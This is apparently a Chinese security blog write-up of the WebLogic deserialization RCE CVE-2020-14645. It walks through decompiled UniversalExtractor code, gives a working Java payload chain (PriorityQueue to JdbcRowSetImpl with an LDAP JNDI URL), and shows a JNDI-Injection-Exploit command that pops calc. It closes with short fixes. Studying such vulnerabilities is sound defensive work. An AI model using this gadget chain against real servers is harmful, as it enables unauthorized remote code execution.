# Weblogic 反序列化RCE漏洞分析(CVE-2020-14645) 

## CVE-2020-14645
### 靶场搭建

#### 本地搭建

下载地址：
https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html

- weblogic 10.3.6.0
- weblogic 12.1.3.0
- weblogic 12.2.1.4
- weblogic 14.1.1.0.0

#### docker搭建

```yaml
version: '3.7'
services:
 weblogic:
   image: store/oracle/weblogic:12.2.1.4
   volumes:
    - ./properties:/u01/oracle/properties
   environment:
    - DOMAIN_NAME=base_domain
   ports:
    - "7001:7001"
    - "8453:8453"
    - "9002:9002"
```

### 漏洞分析

关于JdbcRowSetImpl、PriorityQueue、ExtractorComparator利用链的分析请看[上一篇文章](https://www.studysec.com/#/papers/java/weblogic/CVE-2020-14841)

概况一下就是已知漏洞利用点和前半截利用链，只需要找到一个不在反序列化黑名单中且内部extract方法存在危险代码的类。

CVE-2020-14645的gadget是UniversalExtractor，其extract方法可以通过反射调用任意类中的方法。

执行链： 
T3协议 -> PriorityQueue -> ExtractorComparator -> UniversalExtractor -> JdbcRowSetImpl -> RCE

#### UniversalExtractor

UniversalExtractor.extract代码：

```java
//com.tangosol.util.extractor.UniversalExtractor

public E extract(T oTarget) {
    if (oTarget == null) {
        return null;
    } else {
        //this.m_cacheTarget在前面并没有被赋值，因此这里是null
        TargetReflectionDescriptor targetPrev = this.m_cacheTarget;

        try {
            //由于targetPrev是null，自然第二个判断条件不会成立
            if (targetPrev != null && oTarget.getClass() == targetPrev.getTargetClass()) {
                return targetPrev.isMap() ? ((Map)oTarget).get(this.getCanonicalName()) : targetPrev.getMethod().invoke(oTarget, this.m_aoParam);
            } else {
                //执行到这，调用extractComplex
                return this.extractComplex(oTarget);
            }
        } catch (NullPointerException var4) {
            throw new RuntimeException(this.suggestExtractFailureCause(oTarget.getClass()));
        } catch (Exception var5) {
            throw ensureRuntimeException(var5, oTarget.getClass().getName() + this + '(' + oTarget + ')');
        }
    }
}
```

跟入extractComplex(oTarget)

```java
//com.tangosol.util.extractor.UniversalExtractor

protected E extractComplex(T oTarget) throws InvocationTargetException, IllegalAccessException {
    Class clzTarget = oTarget.getClass();
    Object[] aoParam = this.m_aoParam;
    Class[] clzParam = ClassHelper.getClassArray(aoParam);
    String sCName = this.getCanonicalName();
    boolean fProperty = this.isPropertyExtractor();
    Method method = null;
    if (fProperty) {
        String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);

        for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) {
            method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);
        }
    } else {
        //我们传入的JdbcRowSetImpl在这里获取方法名，getMethodName返回DatabaseMetaData
        method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);
    }

    if (method == null) {
        if (fProperty && oTarget instanceof Map) {
            this.m_cacheTarget = new TargetReflectionDescriptor(clzTarget);
            return ((Map)oTarget).get(sCName);
        }
    } else {
        this.m_cacheTarget = new TargetReflectionDescriptor(clzTarget, method);
    }
    //执行JdbcRowSetImpl
    return method.invoke(oTarget, aoParam);
}
```

这里有一个小细节

在实例化UniversalExtractor时，传入的字符串不能直接写getDatabaseMetaData。

会报错
```java
Exception in thread "main" java.lang.RuntimeException: Missing or inaccessible method: com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData
```

正确的填写方法是DatabaseMetaData或getDatabaseMetaData()

看下UniversalExtractor内部初始化的操作：

类成员变量的定义

```java
public class UniversalExtractor<T, E> extends AbstractExtractor<T, E> implements ValueExtractor<T, E>, ExternalizableLite, PortableObject {
    public static final String[] BEAN_ACCESSOR_PREFIXES;
    public static final String METHOD_SUFFIX = "()";
```

在上文的extractComplex()中，传入findMethod的sName是由```BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute```拼接而成

```java
//com.tangosol.util.extractor.UniversalExtractor#extractComplex
method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);

//com.tangosol.util.ClassHelper#findMethod
public static Method findMethod(Class clz, String sName, Class[] aclzParam, boolean fStatic)
```
BEAN_ACCESSOR_PREFIXES在UniversalExtractor类末尾的static代码块中初始化（static代码块的执行优先级是最高的）

```java
static {
    BEAN_ACCESSOR_PREFIXES = CanonicalNames.VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES;
}
```
CanonicalNames

```java
public class CanonicalNames {
    public static final String VALUE_EXTRACTOR_METHOD_SUFFIX = "()";
    public static final String[] VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES = new String[]{"get", "is"};
```

大致来说，UniversalExtractor实例化后，如果传入的是getDatabaseMetaData()，在对传入的方法名进行规范化的处理时。顺序是
构造方法this.init()
|
v
this.getCanonicalName()
|
v
com.oracle.common.internal.util.CanonicalNames#computeValueExtractorCanonicalName()

最后通过computeValueExtractorCanonicalName去掉括号

如果传入的是DatabaseMetaData，最终在反射执行前，会自动加个get

```java
public UniversalExtractor(@JsonbProperty("name") String sName, @JsonbProperty("params") Object[] aoParam, @JsonbProperty("target") int nTarget) {
    this.m_sNameCanon = null;
    azzert(sName != null);
    if (aoParam != null && aoParam.length > 0 && !sName.endsWith("()")) {
        throw new IllegalArgumentException("UniversalExtractor constructor: parameter sName[value:" + sName + "] must end with method suffix \"" + "()" + "\" when optional parameters provided");
    } else {
        this.m_sName = sName;
        this.m_aoParam = aoParam;
        this.m_nTarget = nTarget;
        this.init();
    }
}

protected void init() {
    String sCName = this.getCanonicalName();
    this.m_fMethod = sCName == null || sCName.endsWith("()");
}

public String getCanonicalName() {
    String sCName = Lambdas.getValueExtractorCanonicalName(this);
    if (sCName == null) {
        sCName = this.m_sNameCanon = CanonicalNames.computeValueExtractorCanonicalName(this.m_sName, this.m_aoParam);
    }

    return sCName;
}
```

#### 为什么不能直接调用有参方法

如果我们直接调用java.lang.Runtime之类的类，想成功利用漏洞起码还得传入一个参数，使用JNDI的好处就是参数这个条件可以忽略。

重新回顾下UniversalExtractor#extractComplex(T oTarget)

```java
//com.tangosol.util.extractor.UniversalExtractor

protected E extractComplex(T oTarget) throws InvocationTargetException, IllegalAccessException {
    Class clzTarget = oTarget.getClass();
    Object[] aoParam = this.m_aoParam;
    Class[] clzParam = ClassHelper.getClassArray(aoParam);
    String sCName = this.getCanonicalName();
    boolean fProperty = this.isPropertyExtractor();
    Method method = null;
    if (fProperty) {
        String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);

        for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) {
            method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);
        }
    } else {
        method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);
    }

    if (method == null) {
        if (fProperty && oTarget instanceof Map) {
            this.m_cacheTarget = new TargetReflectionDescriptor(clzTarget);
            return ((Map)oTarget).get(sCName);
        }
    } else {
        this.m_cacheTarget = new TargetReflectionDescriptor(clzTarget, method);
    }

    return method.invoke(oTarget, aoParam);
}
```

在最后执行method.invoke(oTarget, aoParam)时，还有一个参数aoParam，只要这个参数可控，我们就可以不依赖JNDI，直接调用目标本地的类进行利用。

倒回去找aoParam的值从哪里传入，可以在上面的代码块中看到，extractComplex方法第二行进行赋值```Object[] aoParam = this.m_aoParam;```

```java
public class UniversalExtractor<T, E> extends AbstractExtractor<T, E> implements ValueExtractor<T, E>, ExternalizableLite, PortableObject {
    ...
    protected Object[] m_aoParam;
    ...
    public UniversalExtractor(@JsonbProperty("name") String sName, @JsonbProperty("params") Object[] aoParam, @JsonbProperty("target") int nTarget) {
        ...
        ...
            this.m_sName = sName;
            this.m_aoParam = aoParam;
            this.m_nTarget = nTarget;
            this.init();
        }
    }
```

回到类的构造方法，发现在类实例化时传入的第二个参数赋给了```this.m_aoParam```，且它的类型是对象数组。

看到这里我们已经可以确定aoParam可控，但是在构造好payload后执行并未成功弹出计算器。

通过一番分析，定位到extractComplex方法的第四行:
```java
//com.tangosol.util.extractor.UniversalExtractor
protected E extractComplex(T oTarget) throws InvocationTargetException, IllegalAccessException {
    ...
    //正常情况这里会返回需要调用的目标类的方法名
    String sCName = this.getCanonicalName();
    ...
}

//com.tangosol.util.extractor.UniversalExtractor
public String getCanonicalName() {
    String sCName = Lambdas.getValueExtractorCanonicalName(this);
    if (sCName == null) {
        //在这里进行sCName的获取
        sCName = this.m_sNameCanon = CanonicalNames.computeValueExtractorCanonicalName(this.m_sName, this.m_aoParam);
    }
    return sCName;
}

//com.oracle.common.internal.util.CanonicalNames
public static String computeValueExtractorCanonicalName(String sName, Object[] aoParam) {
    int nMethodSuffixLength = "()".length();
    //重点在于这个判断条件：一旦aoParam值不为空，直接返回null，导致sCName获取不到方法名。
    if (aoParam != null && aoParam.length > 0) {
        return null;
    } else if (!sName.endsWith("()")) {
        return sName;
    } else {
    ...
    ...
```

当sCName为空时，在init()初始化的过程中，经过一系列判断给this.m_fMethod赋值true。

```java
// public boolean isPropertyExtractor() {
//      return !this.m_fMethod;
// }
boolean fProperty = this.isPropertyExtractor();
if (fProperty) {
    String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);

    for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) {
        //正常payload执行流程进入到了这里
        method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);
    }
} else {
    //当我们使aoParam不为空时，进入到了这里
    method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);
}
```

如果能进入```method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);```
我们也是能达到目的的，然而进不得。因为反序列化时少了init()这个过程，导致this.m_fMethod的值为false
而且m_fMethod被transient修饰，无法控制。

```java
private transient boolean m_fMethod;
```

因此这条路是行不通的。

往前倒到extract方法中

```java
public E extract(T oTarget) {
    if (oTarget == null) {
        return null;
    } else {
        TargetReflectionDescriptor targetPrev = this.m_cacheTarget;

        try {
            if (targetPrev != null && oTarget.getClass() == targetPrev.getTargetClass()) {
                return targetPrev.isMap() ? ((Map)oTarget).get(this.getCanonicalName()) : targetPrev.getMethod().invoke(oTarget, this.m_aoParam);
            } else {
                return this.extractComplex(oTarget);
            }
            ...
            ...
    }
}
```

如果this.m_cacheTarget可控，我们也可以达到目的。但是依旧行不通，m_cacheTarget无法控制。因为
```java
private transient TargetReflectionDescriptor m_cacheTarget;
```


#### payload

生成的payload.ser通过T3协议发送

```java
public class CVE_2020_14645 {

    public static void main(String[] args) throws Exception {

        UniversalExtractor universalExtractor = new UniversalExtractor("getDatabaseMetaData()");
        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(universalExtractor));

        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/oiaqfx");

        queue.add(jdbcRowSet);
        queue.add(jdbcRowSet);

        serialize(queue);
        deserialize();
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 漏洞修复

1. 禁用T3、IIOP协议

2. 通过Oracle官网获取并安装最新补丁

### 漏洞利用

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc"
```

启动ldap服务器

生成序列化payload.ser

通过T3协议发送payload.ser

![avatar](../../../../images/java/weblogic/CVE-2020-14645/1.png)

在Weblogic 12.2.1.3版本无法成功，因为12.2.1.3版本没有UniversalExtractor这个类。

### PSF案例

![avatar](../../../../images/java/weblogic/CVE-2020-14645/2.png)
